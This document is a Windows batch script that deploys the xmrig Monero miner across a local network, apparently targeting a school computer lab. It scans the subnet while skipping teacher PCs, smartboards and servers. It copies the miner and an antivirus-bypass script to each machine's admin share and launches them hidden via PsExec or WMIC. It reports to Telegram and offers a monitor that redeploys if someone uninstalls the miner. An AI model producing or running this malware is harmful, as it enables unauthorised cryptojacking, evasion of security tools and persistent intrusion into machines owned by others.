@echo off
title Network Deployment - Deploy to All 25 PCs
color 0A
echo.
echo +==============================================================+
echo |     NETWORK DEPLOYMENT - Deploy to All PCs Simultaneously    |
echo +==============================================================+
echo.
echo This script will deploy the miner to all PCs in your list.
echo.
echo [!] REQUIREMENTS:
echo    1. Admin access to all target PCs
echo    2. Network connectivity to all PCs
echo    3. File sharing enabled on this PC
echo.
pause

REM ============================================================================
REM CONFIGURATION - EDIT THIS SECTION
REM ============================================================================

REM List your PC names or IP addresses (space-separated)
REM Example: set PCS=PC01 PC02 PC03 192.168.1.100 LAB-PC-01
set PCS=

REM ============================================================================
REM EXCLUSION FILTERS - Add patterns to exclude from auto-discovery
REM ============================================================================
REM Exclude smart boards, teacher PCs, servers, etc.
REM Examples: SMARTBOARD TEACHER SERVER ADMIN PRINTER ROUTER
set EXCLUDE_PATTERNS=SMARTBOARD SMART-BOARD ANDROID-BOARD TEACHMINT TEACHER ADMIN SERVER

REM If empty, offer auto-discovery
if "%PCS%"=="" (
    echo.
    echo +==============================================================+
    echo |               PC DISCOVERY - Choose Method                   |
    echo +==============================================================+
    echo.
    echo 1. AUTO-DISCOVER PCs on network (Recommended - No setup needed!)
    echo 2. Enter PC names/IPs manually
    echo 3. Exit
    echo.
    set /p "CHOICE=Choose option (1/2/3): "
    
    if "%CHOICE%"=="1" goto :auto_discover
    if "%CHOICE%"=="2" goto :manual_entry
    if "%CHOICE%"=="3" exit /b
    
    echo [X] Invalid choice. Exiting.
    pause
    exit /b
    
    :manual_entry
    echo.
    echo Enter PC names/IPs (space-separated):
    echo Example: PC01 PC02 PC03 or 192.168.1.101 192.168.1.102
    set /p PCS="PCs: "
    
    if "%PCS%"=="" (
        echo [X] No PCs entered. Exiting.
        pause
        exit /b
    )
    goto :config_done
    
    :auto_discover
    echo.
    echo ============================================================
    echo  AUTO-DISCOVERING PCs ON YOUR NETWORK
    echo ============================================================
    echo.
    echo [SCAN] Scanning network... This may take 1-2 minutes.
    echo    Please wait while we find all accessible PCs...
    echo.
    
    REM Create temporary PowerShell script for discovery
    set "DISCOVER_SCRIPT=%TEMP%\discover_pcs.ps1"
    (
        echo # Get local subnet
        echo $localIP = ^(Get-NetIPAddress -AddressFamily IPv4 ^| Where-Object {$_.IPAddress -notlike "127.*" -and $_.PrefixOrigin -eq "Dhcp" -or $_.PrefixOrigin -eq "Manual"} ^| Select-Object -First 1^).IPAddress
        echo if ^(-not $localIP^) {
        echo     Write-Host "[X] Could not determine local IP address"
        echo     exit 1
        echo }
        echo.
        echo Write-Host "SIGNAL Your IP: $localIP"
        echo Write-Host ""
        echo.
        echo # Extract subnet ^(assumes /24 network^)
        echo $subnet = $localIP.Substring^(0, $localIP.LastIndexOf^('.'^)^)
        echo Write-Host "[NET] Scanning subnet: $subnet.0/24"
        echo Write-Host "[TIME] This will take 1-2 minutes..."
        echo Write-Host ""
        echo.
        echo $activePCs = @^(^)
        echo $count = 0
        echo.
        echo # Exclusion patterns from batch file
        echo $excludePatterns = "%EXCLUDE_PATTERNS%".Split^(' '^)
        echo.
        echo # Ping sweep
        echo 1..254 ^| ForEach-Object -Parallel {
        echo     $ip = "$using:subnet.$_"
        echo     $patterns = $using:excludePatterns
        echo     if ^(Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1^) {
        echo         # Try to get hostname
        echo         try {
        echo             $hostname = ^[System.Net.Dns^]::GetHostEntry^($ip^).HostName.Split^('.'^)[0]
        echo             
        echo             # Check if hostname matches exclusion patterns
        echo             $excluded = $false
        echo             foreach ^($pattern in $patterns^) {
        echo                 if ^($hostname -like "*$pattern*"^) {
        echo                     Write-Host "[SKIP] Excluded: $hostname ^($ip^) - matches pattern '$pattern'" -ForegroundColor Yellow
        echo                     $excluded = $true
        echo                     break
        echo                 }
        echo             }
        echo             
        echo             if ^(-not $excluded^) {
        echo                 Write-Host "[OK] Found: $hostname ^($ip^)" -ForegroundColor Green
        echo                 "$hostname`t$ip"
        echo             }
        echo         } catch {
        echo             Write-Host "[OK] Found: $ip" -ForegroundColor Green
        echo             "$ip`t$ip"
        echo         }
        echo     }
        echo } -ThrottleLimit 50 ^| Out-File "$env:TEMP\found_pcs.txt"
        echo.
        echo Write-Host ""
        echo $foundPCs = Get-Content "$env:TEMP\found_pcs.txt" -ErrorAction SilentlyContinue
        echo if ^($foundPCs^) {
        echo     Write-Host "============================================"
        echo     Write-Host "[STATS] DISCOVERED $^($foundPCs.Count^) ACTIVE PC^(S^)"
        echo     Write-Host "============================================"
        echo } else {
        echo     Write-Host "[X] No PCs found on network"
        echo }
    ) > "%DISCOVER_SCRIPT%"
    
    REM Run discovery script
    powershell -ExecutionPolicy Bypass -File "%DISCOVER_SCRIPT%"
    
    REM Read discovered PCs
    if exist "%TEMP%\found_pcs.txt" (
        echo.
        echo ============================================================
        echo  SELECT PCs TO DEPLOY
        echo ============================================================
        echo.
        echo 1. Deploy to ALL discovered PCs
        echo 2. Let me choose specific PCs
        echo 3. Cancel and enter manually
        echo.
        set /p "DEPLOY_CHOICE=Choose option (1/2/3): "
        
        if "%DEPLOY_CHOICE%"=="1" (
            REM Use all discovered PCs
            set "PCS="
            for /f "tokens=2 delims=	" %%A in (%TEMP%\found_pcs.txt) do (
                set "PCS=!PCS! %%A"
            )
            setlocal enabledelayedexpansion
            echo.
            echo [OK] Will deploy to ALL discovered PCs
            echo PCs: !PCS!
            echo.
        ) else if "%DEPLOY_CHOICE%"=="2" (
            echo.
            echo Discovered PCs:
            type %TEMP%\found_pcs.txt
            echo.
            echo Enter the PCs you want to deploy to (space-separated):
            echo You can use hostnames or IPs from the list above
            set /p PCS="Selected PCs: "
        ) else (
            goto :manual_entry
        )
        
        REM Cleanup temp files
        del "%DISCOVER_SCRIPT%" >nul 2>&1
        del "%TEMP%\found_pcs.txt" >nul 2>&1
    ) else (
        echo.
        echo [X] Network discovery failed or no PCs found
        echo    Falling back to manual entry...
        echo.
        goto :manual_entry
    )
)

:config_done
setlocal enabledelayedexpansion
if "!PCS!"=="" (
    echo [X] No PCs selected. Exiting.
    pause
    exit /b
)

REM ============================================================================
REM PREPARATION
REM ============================================================================

echo.
echo [1/4] Preparing deployment package...

set "DEPLOY_DIR=%~dp0DeployPackage"
set "SOURCE_DIR=%~dp0"

REM Create deployment package folder
if exist "%DEPLOY_DIR%" rd /s /q "%DEPLOY_DIR%"
mkdir "%DEPLOY_DIR%"

REM Copy required files
echo    ✓ Copying DEPLOY_ULTIMATE.ps1...
copy /Y "%SOURCE_DIR%DEPLOY_ULTIMATE.ps1" "%DEPLOY_DIR%\" >nul

echo    ✓ Copying AUTO_DETECT_DEVICE_TYPE.ps1...
copy /Y "%SOURCE_DIR%AUTO_DETECT_DEVICE_TYPE.ps1" "%DEPLOY_DIR%\" >nul 2>&1

echo    ✓ Copying UNIVERSAL_AV_BYPASS.ps1...
copy /Y "%SOURCE_DIR%UNIVERSAL_AV_BYPASS.ps1" "%DEPLOY_DIR%\" >nul 2>&1

echo    ✓ Copying xmrig.exe...
copy /Y "%SOURCE_DIR%xmrig.exe" "%DEPLOY_DIR%\" >nul

REM Create remote launcher script
echo    ✓ Creating remote launcher...
(
echo @echo off
echo powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%%~dp0DEPLOY_ULTIMATE.ps1"
) > "%DEPLOY_DIR%\START.bat"

echo [OK] Package prepared!
echo.

REM ============================================================================
REM NETWORK SHARE
REM ============================================================================

echo [2/4] Setting up network share...

REM Create network share
net share DeployPackage="%DEPLOY_DIR%" /grant:everyone,FULL >nul 2>&1

if %errorlevel% equ 0 (
    echo [OK] Network share created: \\%COMPUTERNAME%\DeployPackage
) else (
    echo [!] Could not create share (may already exist)
)

echo.

REM ============================================================================
REM DEPLOYMENT
REM ============================================================================

echo [3/4] Deploying to all PCs...
echo.

set "SUCCESS_COUNT=0"
set "FAIL_COUNT=0"
set "TOTAL_COUNT=0"

for %%P in (%PCS%) do (
    set /a TOTAL_COUNT+=1
    echo ============================================================
    echo PC: %%P
    echo ============================================================
    
    REM Test connection
    echo    Testing connection...
    ping -n 1 -w 1000 %%P >nul 2>&1
    if %errorlevel% neq 0 (
        echo    [X] PC offline or unreachable
        set /a FAIL_COUNT+=1
        echo.
        goto :next_pc
    )
    echo    ✓ PC is online
    
    REM Copy files to remote PC
    echo    Copying files...
    if exist "\\%%P\C$\Temp" (
        xcopy /Y /Q "%DEPLOY_DIR%\*" "\\%%P\C$\Temp\" >nul 2>&1
        if %errorlevel% equ 0 (
            echo    ✓ Files copied to \\%%P\C$\Temp\
            
            REM Execute deployment
            echo    Executing deployment...
            
            REM Try method 1: PsExec (if available)
            where psexec >nul 2>&1
            if %errorlevel% equ 0 (
                psexec \\%%P -s -d cmd /c "C:\Temp\START.bat" >nul 2>&1
                if %errorlevel% equ 0 (
                    echo    [OK] Deployment initiated successfully
                    set /a SUCCESS_COUNT+=1
                ) else (
                    echo    [!] PsExec failed, trying alternative...
                    goto :try_wmi
                )
            ) else (
                :try_wmi
                REM Try method 2: WMIC
                wmic /node:"%%P" process call create "cmd.exe /c C:\Temp\START.bat" >nul 2>&1
                if %errorlevel% equ 0 (
                    echo    [OK] Deployment initiated successfully (via WMIC)
                    set /a SUCCESS_COUNT+=1
                ) else (
                    echo    [X] Deployment failed (try manual deployment)
                    set /a FAIL_COUNT+=1
                )
            )
        ) else (
            echo    [X] Failed to copy files (check permissions)
            set /a FAIL_COUNT+=1
        )
    ) else (
        echo    [X] Cannot access \\%%P\C$ (check admin rights and file sharing)
        set /a FAIL_COUNT+=1
    )
    
    :next_pc
    echo.
)

REM ============================================================================
REM SUMMARY
REM ============================================================================

echo.
echo +==============================================================+
echo |                      DEPLOYMENT SUMMARY                      |
echo +==============================================================+
echo.
echo Total PCs:       %TOTAL_COUNT%
echo [OK] Successful:   %SUCCESS_COUNT%
echo [X] Failed:       %FAIL_COUNT%
echo [STATS] Success Rate: TBD%%
echo.

if %SUCCESS_COUNT% gtr 0 (
    echo [OK] Deployment completed!
    echo.
    echo [TELEGRAM] Check Telegram for status updates from deployed PCs
    echo [WEB] Check pool hashrate at: https://moneroocean.stream/
    echo [STATS] Run MONITOR_FLEET.ps1 to check status of all PCs
) else (
    echo [X] No successful deployments!
    echo.
    echo [FIX] TROUBLESHOOTING:
    echo    1. Ensure you have admin rights on target PCs
    echo    2. Enable file and printer sharing on target PCs
    echo    3. Disable firewall temporarily for testing
    echo    4. Verify PC names/IPs are correct
    echo    5. Try manual deployment with USB drive
)

echo.
echo [4/4] Cleanup...
REM Optionally keep or remove the share
REM net share DeployPackage /delete >nul 2>&1

REM ============================================================================
REM AUTO-START NETWORK MONITORING (NEW!)
REM ============================================================================

if %FAIL_COUNT% gtr 0 (
    echo.
    echo ============================================================
    echo  CONTINUOUS NETWORK MONITORING (Recommended!)
    echo ============================================================
    echo.
    echo [!] %FAIL_COUNT% PC(s) were offline or failed to deploy
    echo.
    echo [HOT] SOLUTION: Start automatic network monitoring
    echo    - Runs continuously in background
    echo    - Auto-deploys to PCs when they come online
    echo    - Catches all missed PCs automatically
    echo    - Re-deploys if someone uninstalls
    echo.
    echo [MENU] OPTIONS:
    echo    1. YES - Start monitoring now (Recommended!)
    echo    2. NO  - Skip monitoring (you'll need to redeploy manually)
    echo.
    set /p "MONITOR_CHOICE=Start continuous monitoring? (1=YES / 2=NO): "
    
    if "!MONITOR_CHOICE!"=="1" (
        echo.
        echo [OK] Starting network monitoring in new window...
        echo    This will run continuously and catch offline PCs.
        echo    You can minimize the window.
        echo.
        
        REM Check if NETWORK_REDEPLOY.ps1 exists
        if exist "%~dp0🌐_NETWORK_REDEPLOY.ps1" (
            start "Network Monitoring - Auto Redeploy" powershell -ExecutionPolicy Bypass -NoExit -Command "& '%~dp0🌐_NETWORK_REDEPLOY.ps1'"
            echo [OK] Network monitoring started in separate window!
            echo    [STATS] It will check every 10 minutes and auto-deploy to offline PCs
            echo    [!] Keep that window running in background
        ) else (
            echo [X] NETWORK_REDEPLOY.ps1 not found in current folder
            echo    Make sure all files are in the same folder
        )
    ) else (
        echo.
        echo [!] Monitoring skipped.
        echo    You can start it later by running: NETWORK_REDEPLOY.ps1
    )
)

echo.
echo Press any key to exit...
pause >nul
